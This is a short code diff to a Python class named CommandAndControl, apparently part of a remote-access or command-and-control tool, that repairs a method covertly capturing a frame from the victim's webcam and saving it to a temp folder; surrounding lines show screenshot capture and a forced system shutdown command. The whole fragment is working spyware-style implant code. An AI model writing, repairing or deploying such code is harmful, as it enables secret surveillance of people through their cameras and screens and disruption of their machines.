@@ -32,14 +32,14 @@ class CommandAndControl():
         pyautogui.screenshot(ss_path)
 
     
-    def getfrontcam(self): # Does not work at moment
-        webcam = cv2.VideoCapture(0)        
-        check, frame = webcam.read()
+    def getfrontcam(self):
+        cap = cv2.VideoCapture(0)
+        ret, frame = cap.read()
         img_name = f"pyc2webcam{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.png"
-        webp_path = f"{self.temp_dir}\\{img_name}"
-        cv2.imwrite(filename=webp_path, img=frame)
-        webcam.release()
-        
+        fcam_path = f"{self.temp_dir}\\{img_name}"
+        cv2.imwrite(fcam_path, frame)
+        cap.release()
+    
     
     def shutdown_client(self):
         os.system("shutdown /s /f /t 0")
